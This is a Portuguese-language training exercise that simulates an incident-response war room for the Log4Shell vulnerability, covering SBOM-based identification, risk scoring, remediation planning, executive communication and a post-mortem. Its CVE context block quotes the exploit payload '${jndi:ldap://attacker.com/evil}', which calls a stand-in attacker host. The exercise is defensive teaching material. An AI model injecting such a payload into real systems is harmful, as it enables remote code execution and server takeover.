---
layout: exercise
title: "Exerc√≠cio 2.5.4: War Room de CVE Cr√≠tica (Log4Shell)"
slug: "cve-war-room"
lesson_id: "lesson-2-5"
module: "module-2"
difficulty: "Avan√ßado ‚≠ê‚≠ê"
permalink: /modules/testes-seguranca-pratica/lessons/exercises/lesson-2-5-exercise-4-cve-war-room/
lesson_url: /modules/testes-seguranca-pratica/lessons/dependency-scanning-sca/
---

## Objetivo

Este exerc√≠cio simula um **cen√°rio de crise real**: voc√™ est√° respondendo a uma CVE cr√≠tica (CVSS 10.0) publicada h√° 2 horas. Sua miss√£o √© identificar sistemas afetados via SBOM, priorizar remedia√ß√£o e criar plano de a√ß√£o execut√°vel em tempo recorde.

Ao completar este exerc√≠cio, voc√™ ser√° capaz de:

- Usar SBOM para identifica√ß√£o r√°pida de depend√™ncias vulner√°veis
- Priorizar sistemas por risco e exposi√ß√£o em situa√ß√£o de crise
- Criar plano de remedia√ß√£o emergencial execut√°vel
- Comunicar riscos e status para stakeholders t√©cnicos e executivos
- Tomar decis√µes sob press√£o com informa√ß√µes incompletas

---

## Pr√©-requisitos

- Conhecimento b√°sico de SCA e SBOM
- Familiaridade com severidade CVSS e prioriza√ß√£o de risco
- No√ß√µes de comunica√ß√£o com stakeholders

---

## Passo a Passo

**Cen√°rio**: Sexta-feira, 02:00 AM. CVE-2021-44228 (Log4Shell) foi publicada h√° 2 horas com CVSS 10.0 (m√°xima severidade). √â uma vulnerabilidade RCE (Remote Code Execution) sem autentica√ß√£o no Apache Log4j 2.x. Bots automatizados j√° est√£o explorando ativamente na internet.

Voc√™ √© o **QA Security on-call**. Seu telefone toca: "Precisamos saber AGORA quais aplica√ß√µes est√£o vulner√°veis. C-Level quer status em 1 hora."

### Contexto

Empresa tem:
- 50 aplica√ß√µes em produ√ß√£o (mix de Java, Node.js, Python)
- 15 aplica√ß√µes Java conhecidas (suspeitas de usar Log4j)
- 8 aplica√ß√µes internet-facing (alto risco)
- SLA de uptime 99.9% (downtime custa $50k/hora)

### Tarefa Principal

**Voc√™ tem 3 horas para:**
1. Identificar aplica√ß√µes afetadas via SBOM/SCA
2. Priorizar por risco (exposi√ß√£o + impacto)
3. Criar plano de remedia√ß√£o execut√°vel
4. Comunicar status para stakeholders

---

## Requisitos

### Contexto Adicional

**Informa√ß√µes Dispon√≠veis:**

```yaml
CVE-2021-44228 (Log4Shell):
  Severidade: CVSS 10.0 (Critical)
  Biblioteca Afetada: Apache Log4j 2.x (vers√µes 2.0-beta9 at√© 2.14.1)
  Tipo: Remote Code Execution (RCE) sem autentica√ß√£o
  Exploitability: Trivial (payloads p√∫blicos dispon√≠veis)
  Patch Dispon√≠vel: Sim (upgrade para 2.15.0, depois 2.16.0, finalmente 2.17.0)
  
Vetor de Explora√ß√£o:
  - Qualquer campo de input que seja logado (user-agent, headers, form fields)
  - Payload: ${jndi:ldap://attacker.com/evil}
  - Permite execu√ß√£o arbitr√°ria de c√≥digo no servidor
  
Impacto:
  - Takeover completo do servidor
  - Acesso a dados sens√≠veis (DB credentials, API keys)
  - Lateral movement poss√≠vel (pivot para outros sistemas)
```

**Invent√°rio de Aplica√ß√µes (fornecido):**

```markdown
| ID | Aplica√ß√£o | Linguagem | Exposi√ß√£o | Dados Sens√≠veis | SLA | Deploy Frequency |
|----|-----------|-----------|-----------|----------------|-----|------------------|
| A1 | API Gateway | Java | Internet | PII + Pagamentos | 99.9% | 10x/dia |
| A2 | Admin Portal | Java | Intranet | Admin Access | 99.5% | 1x/semana |
| A3 | Mobile Backend | Java | Internet | PII | 99.9% | 5x/dia |
| A4 | Batch Jobs | Java | Interno | Financeiro | 95% | 1x/m√™s |
| A5 | Microservice Auth | Java | Internet | Credenciais | 99.99% | 3x/dia |
| A6 | Analytics Dashboard | Java | Intranet | Business Data | 95% | 1x/m√™s |
| A7 | Webhooks Processor | Java | Internet | Integra√ß√µes | 99.5% | 2x/semana |
| A8 | Legacy Monolith | Java | Intranet | Tudo | 99.9% | 1x/trimestre |
| A9 | Frontend SPA | Node.js | Internet | Nenhum | 99.9% | 20x/dia |
| A10 | Kafka Consumer | Java | Interno | Eventos | 99% | 1x/m√™s |
| A11 | gRPC Service | Go | Interno | Transa√ß√µes | 99.9% | 5x/dia |
| A12 | Notification Service | Python | Interno | Emails | 95% | 1x/semana |
| A13 | Scheduler | Java | Interno | Tarefas | 95% | 1x/m√™s |
| A14 | Reporting API | Java | Intranet | Relat√≥rios | 95% | 1x/m√™s |
| A15 | Cache Service | Java | Interno | Cache | 99% | 1x/semana |
```

### Passo 1: Identifica√ß√£o R√°pida via SBOM

**1.1. Cen√°rio SEM SBOM (pior caso)**

Simule o que aconteceria:
```bash
# Sem SBOM, voc√™ teria que:
1. SSH em cada servidor (50 servidores)
2. Encontrar cada aplica√ß√£o Java manualmente
3. Inspecionar JARs ou WAR files
4. Grep por log4j em cada aplica√ß√£o
   
Estimativa: 2-3 SEMANAS de trabalho manual
Risco: Aplica√ß√µes vulner√°veis ficam expostas por semanas
```

**1.2. Cen√°rio COM SBOM (melhor caso)**

Simule busca no SBOM:
```bash
# SBOM permite query instant√¢nea:
grep -r "log4j-core" sbom/*.json

# Resultado em 30 segundos:
# A1: log4j-core 2.14.1 ‚úÖ VULNER√ÅVEL
# A2: log4j-core 2.13.3 ‚úÖ VULNER√ÅVEL  
# A3: log4j-core 2.14.1 ‚úÖ VULNER√ÅVEL
# A4: log4j-core 2.12.1 ‚úÖ VULNER√ÅVEL
# A5: log4j-core 2.14.1 ‚úÖ VULNER√ÅVEL
# A7: log4j-core 2.11.2 ‚úÖ VULNER√ÅVEL
# A8: log4j-core 2.14.0 ‚úÖ VULNER√ÅVEL
# A10: log4j-core 2.14.1 ‚úÖ VULNER√ÅVEL
# A13: log4j-core 2.12.1 ‚úÖ VULNER√ÅVEL
# A15: log4j-core 2.14.1 ‚úÖ VULNER√ÅVEL

# 10 aplica√ß√µes vulner√°veis de 15 Java apps (67%)
```

**Tarefa 1.1**: Documente quais aplica√ß√µes est√£o afetadas e suas vers√µes de Log4j.

**Tarefa 1.2**: Calcule o tempo economizado usando SBOM vs busca manual.

### Passo 2: Prioriza√ß√£o por Risco (Matriz de Decis√£o)

**2.1. Criar Matriz de Prioriza√ß√£o**

Use esta f√≥rmula:
```
Risco Score = (Exposi√ß√£o √ó 3) + (Dados Sens√≠veis √ó 2) + (SLA √ó 1)

Onde:
- Exposi√ß√£o: Internet=3, Intranet=2, Interno=1
- Dados Sens√≠veis: PII+Pagamentos=3, PII/Credenciais=2, Outros=1
- SLA: 99.99%=3, 99.9%=2, <99.9%=1
```

**Tarefa 2.1**: Calcule o Risco Score para cada aplica√ß√£o vulner√°vel.

**Exemplo de C√°lculo:**
```
A1 (API Gateway):
- Exposi√ß√£o: Internet = 3 √ó 3 = 9
- Dados Sens√≠veis: PII + Pagamentos = 3 √ó 2 = 6
- SLA: 99.9% = 2 √ó 1 = 2
= Total: 17 pontos (CR√çTICO)

A2 (Admin Portal):
- Exposi√ß√£o: Intranet = 2 √ó 3 = 6
- Dados Sens√≠veis: Admin Access = 2 √ó 2 = 4
- SLA: 99.5% = 1 √ó 1 = 1
= Total: 11 pontos (ALTO)
```

**Tarefa 2.2**: Crie ranking de prioridade (P0 a P3):
- **P0** (Critical): Risco Score ‚â• 15 - Remediar em 4 horas
- **P1** (High): Risco Score 10-14 - Remediar em 24 horas
- **P2** (Medium): Risco Score 5-9 - Remediar em 1 semana
- **P3** (Low): Risco Score < 5 - Remediar em 1 m√™s

### Passo 3: Plano de Remedia√ß√£o Execut√°vel

**3.1. Criar Timeline de Remedia√ß√£o**

**Tarefa 3.1**: Preencha este template para CADA aplica√ß√£o P0/P1:

```markdown
## Aplica√ß√£o: [Nome] (Prioridade: [P0/P1])

### Status Atual
- Vers√£o Log4j: [vers√£o]
- Exposi√ß√£o: [Internet/Intranet/Interno]
- √öltimo Deploy: [data]
- Owner: [time respons√°vel]

### Plano de Remedia√ß√£o
**Op√ß√£o Escolhida**: [marque uma]
- [ ] Op√ß√£o 1: Upgrade para Log4j 2.17.0 (definitivo)
- [ ] Op√ß√£o 2: Aplicar workaround tempor√°rio (bloquear JNDI lookup)
- [ ] Op√ß√£o 3: Mitiga√ß√£o via WAF (tempor√°rio at√© patch)
- [ ] Op√ß√£o 4: Desligar aplica√ß√£o temporariamente (√∫ltimo recurso)

**Justificativa da Op√ß√£o**: [explique por qu√™ escolheu esta op√ß√£o]

### Steps to Execute
1. [ ] [Hora XX:00] Dev atualiza depend√™ncia para 2.17.0
2. [ ] [Hora XX:15] Build e testes automatizados (staging)
3. [ ] [Hora XX:30] Deploy em staging + smoke tests
4. [ ] [Hora XX:45] Valida√ß√£o manual (QA)
5. [ ] [Hora XX:55] Aprova√ß√£o CISO (se necess√°rio)
6. [ ] [Hora XX:00+1] Deploy em produ√ß√£o
7. [ ] [Hora XX:10+1] Monitoramento de logs (tentativas de explora√ß√£o)
8. [ ] [Hora XX:20+1] Confirmar patch funcionando (scan ZAP/Burp)

### Riscos do Deploy
- Risco de quebrar funcionalidade: [Alto/M√©dio/Baixo]
- Testes de regress√£o dispon√≠veis: [Sim/N√£o]
- Rollback preparado: [Sim/N√£o]
- Downtime esperado: [X minutos]

### Comunica√ß√£o
- [ ] Notificar Product Owner
- [ ] Notificar Ops/DevOps
- [ ] Notificar Security Team
- [ ] Notificar C-Level (se P0)
- [ ] Atualizar status em War Room

### Valida√ß√£o P√≥s-Deploy
- [ ] Verificar que Log4j 2.17.0 est√° ativo (SBOM atualizado)
- [ ] Testar payload de explora√ß√£o (confirmar n√£o funciona)
- [ ] Monitorar logs por tentativas de ataque
- [ ] Confirmar funcionalidades cr√≠ticas OK
```

**Tarefa 3.2**: Crie plano para pelo menos 3 aplica√ß√µes (1 P0 + 2 P1).

### Passo 4: Trade-offs e Decis√µes Dif√≠ceis

**4.1. Dilema 1: Velocidade vs Estabilidade**

**Cen√°rio**: A1 (API Gateway) √© P0, mas √∫ltimo deploy quebrou produ√ß√£o. Deploy agora ou aguardar testes?

**Tarefa 4.1**: Decida e justifique:
- [ ] Deploy IMEDIATAMENTE (aceitar risco de instabilidade)
- [ ] Testes m√≠nimos + Deploy em 2h (balanceado)
- [ ] Testes completos + Deploy em 6h (mais seguro)
- [ ] Aplicar WAF rule tempor√°rio + Deploy normal em 24h

**Justifique sua decis√£o considerando:**
- Exploitability da CVE (trivial, exploits p√∫blicos)
- Impacto de downtime ($50k/hora)
- Hist√≥rico de estabilidade da app
- Cobertura de testes automatizados

**4.2. Dilema 2: Mitiga√ß√£o Tempor√°ria vs Patch Definitivo**

**Cen√°rio**: A8 (Legacy Monolith) √© vulner√°vel mas deploy leva 4 horas (processo manual complexo). CVE est√° sendo explorada ativamente.

**Op√ß√µes:**
```yaml
Op√ß√£o A: Patch Definitivo (Upgrade Log4j)
  Pr√≥s: Resolve completamente
  Contras: Deploy complexo (4h), risco de quebrar (app legacy)
  
Op√ß√£o B: Workaround Tempor√°rio (Desabilitar JNDI lookup)
  Pr√≥s: R√°pido (30 min), baixo risco
  Contras: N√£o √© patch oficial, pode ter bypasses
  
Op√ß√£o C: WAF Rule (Bloquear payloads conhecidos)
  Pr√≥s: Instant√¢neo (5 min), zero downtime
  Contras: Pode ser bypassado, n√£o resolve root cause
  
Op√ß√£o D: Desligar Aplica√ß√£o Temporariamente
  Pr√≥s: Elimina risco 100%
  Contras: Impacto no neg√≥cio, poss√≠vel perda de receita
```

**Tarefa 4.2**: Escolha uma op√ß√£o e justifique detalhadamente.

**4.3. Dilema 3: Comunica√ß√£o de Risco para C-Level**

**Cen√°rio**: CEO quer saber: "Estamos seguros? Podemos continuar operando?"

**Tarefa 4.3**: Escreva update executivo (m√°ximo 5 frases):
- Status atual (quantas apps vulner√°veis)
- Risco atual (pode ser explorado? qual impacto?)
- A√ß√µes em andamento (o que estamos fazendo AGORA)
- Timeline de resolu√ß√£o (quando estar√° seguro)
- Recomenda√ß√£o (continuar operando ou n√£o)

**Template:**
```
Subject: URGENT - Log4Shell CVE Response Status [Hora XX:00]

Identificamos [N] aplica√ß√µes vulner√°veis de [Total] em produ√ß√£o.
[N] aplica√ß√µes cr√≠ticas (internet-facing) est√£o sendo patcheadas AGORA.
Risco atual: [Alto/M√©dio/Baixo] - [Pode ser/Est√° sendo] explorado ativamente.
Timeline: [X] apps corrigidas em [Y] horas, 100% coverage em [Z] horas.
Recomenda√ß√£o: [Continuar operando com monitoramento intenso / Desligar apps cr√≠ticas temporariamente].

Pr√≥ximo update: [Hora XX:00]
```

### Passo 5: Post-Mortem e Li√ß√µes Aprendidas

**Tarefa 5.1**: Ap√≥s "resolver" a crise, documente:

**5.1. O que funcionou bem:**
- [ ] SBOM permitiu identifica√ß√£o em minutos (vs semanas)
- [ ] Prioriza√ß√£o clara evitou panic mode
- [ ] Plano de remedia√ß√£o execut√°vel
- [ ] Comunica√ß√£o efetiva com stakeholders

**5.2. O que poderia ter sido melhor:**
- [ ] SBOM desatualizado para 3 aplica√ß√µes
- [ ] Falta de testes automatizados em Legacy Monolith
- [ ] Deploy manual muito lento
- [ ] Sem playbook de resposta a CVE (tudo ad-hoc)

**5.3. Action Items para Prevenir Pr√≥xima Crise:**
```markdown
1. [ ] Automatizar gera√ß√£o de SBOM em CI/CD (toda app)
2. [ ] Criar playbook de resposta a CVE cr√≠tica
3. [ ] Implementar auto-updates de depend√™ncias (Renovate/Dependabot)
4. [ ] Aumentar cobertura de testes automatizados (target 80%)
5. [ ] Setup WAF com rules OWASP Top 10 (defesa em profundidade)
6. [ ] Treinar time em incident response (tabletop exercises)
7. [ ] Criar dashboard de "Days Since Last CVE" (m√©trica de exposi√ß√£o)
```

---

## Desafios Adicionais (Para QAs Plenos)

### Desafio 1: Trade-off Financeiro

**Cen√°rio**: A1 (API Gateway) processa 10.000 transa√ß√µes/hora. Cada transa√ß√£o gera $2 de receita. Deploy precisa de downtime de 10 minutos.

**Tarefa**: Calcule:
- Perda de receita durante deploy: $____
- Custo de explora√ß√£o bem-sucedida (data breach): $1.5M estimado
- ROI de patch imediato vs aguardar janela de manuten√ß√£o
- Decis√£o justificada

### Desafio 2: Falso Negativo no SBOM

**Cen√°rio**: SBOM mostrou 10 apps vulner√°veis. Post-mortem descobriu que A11 (gRPC Service) tamb√©m tinha Log4j transitive dependency n√£o detectada.

**Tarefa**: 
- Por que SBOM falhou?
- Como prevenir false negatives?
- Redesenhe processo de gera√ß√£o de SBOM

### Desafio 3: Supply Chain Attack

**Cen√°rio**: Durante remedia√ß√£o, desenvolvedor baixa "patch" de site n√£o oficial. Patch cont√©m backdoor.

**Tarefa**:
- Como prevenir supply chain attacks durante incident response?
- Que verifica√ß√µes fazer antes de aplicar patches?
- Criar checklist de seguran√ßa para downloads de depend√™ncias

---

## Dicas

1. **Prioriza√ß√£o √© cr√≠tica**: N√£o tente patchear tudo ao mesmo tempo. Foque no maior risco primeiro.
2. **Comunica√ß√£o constante**: Updates frequentes evitam panic e cobran√ßas desnecess√°rias.
3. **Rollback preparado**: Sempre tenha plano B se patch quebrar produ√ß√£o.
4. **Monitoramento ativo**: Ap√≥s patch, monitore logs por tentativas de explora√ß√£o.
5. **SBOM √© lifesaver**: Invista tempo mantendo SBOM atualizado. Paga em crises.
6. **WAF n√£o √© solu√ß√£o definitiva**: Use como tempor√°rio, n√£o substituto de patch.
7. **Test in staging**: Mesmo em crise, teste minimamente antes de produ√ß√£o.
8. **Document everything**: Post-mortem depende de documenta√ß√£o durante crise.

---

## Valida√ß√£o

Verifique se voc√™ completou o exerc√≠cio corretamente:

- [ ] Identificou todas as 10 aplica√ß√µes vulner√°veis via SBOM
- [ ] Calculou Risco Score para cada aplica√ß√£o
- [ ] Priorizou aplica√ß√µes (P0, P1, P2, P3)
- [ ] Criou plano de remedia√ß√£o execut√°vel para pelo menos 3 apps
- [ ] Tomou decis√µes justificadas em 3 dilemas
- [ ] Escreveu update executivo para C-Level
- [ ] Documentou post-mortem com action items
- [ ] Considerou trade-offs financeiros e t√©cnicos

---

## Pr√≥ximos Passos

Ap√≥s completar este exerc√≠cio, voc√™ estar√° preparado para:

- Responder a CVEs cr√≠ticas reais com confian√ßa
- Usar SBOM como ferramenta estrat√©gica em crises
- Priorizar remedia√ß√£o por risco real (n√£o apenas CVSS)
- Comunicar efetivamente com stakeholders t√©cnicos e executivos
- Tomar decis√µes sob press√£o com informa√ß√µes incompletas

---

## üì§ Enviar Resposta

Complete o exerc√≠cio e envie:

1. Tabela de aplica√ß√µes vulner√°veis com Risco Score
2. Plano de remedia√ß√£o para 3 aplica√ß√µes (1 P0 + 2 P1)
3. Decis√µes justificadas nos 3 dilemas
4. Update executivo para C-Level
5. Post-mortem com action items

{% include exercise-submission-form.html %}

---

## üíº Contexto CWI (Exemplo Real)

**Cen√°rio Real**: Durante Log4Shell (dezembro 2021), CWI identificou 15 aplica√ß√µes afetadas em 2 horas usando SBOM automatizado.

**Timeline Real:**
- **Hora 0 (01:00)**: CVE publicada
- **Hora 1 (02:00)**: SBOM scan identificou 15 apps
- **Hora 4 (05:00)**: 5 apps cr√≠ticas (internet-facing) patcheadas
- **Hora 24 (01:00+1)**: 100% das apps corrigidas
- **Resultado**: Zero explora√ß√µes bem-sucedidas

**Li√ß√£o**: SBOM permitiu resposta 10x mais r√°pida que concorrentes.

---

**Dura√ß√£o Estimada**: 120-180 minutos  
**N√≠vel**: Avan√ßado ‚≠ê‚≠ê  
**Pr√©-requisitos**: Aula 2.5 (Dependency Scanning e SCA), conhecimento de SBOM, experi√™ncia com incident response
